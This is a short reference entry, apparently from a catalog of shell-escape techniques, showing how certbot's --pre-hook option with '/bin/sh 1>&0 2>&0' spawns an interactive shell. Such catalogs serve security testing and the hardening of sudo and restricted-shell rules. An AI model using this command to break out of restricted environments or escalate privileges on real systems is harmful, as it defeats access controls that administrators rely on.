title: certbot
html:
certbot

Shell

This needs a writable directory, replace `.` if needed.

certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
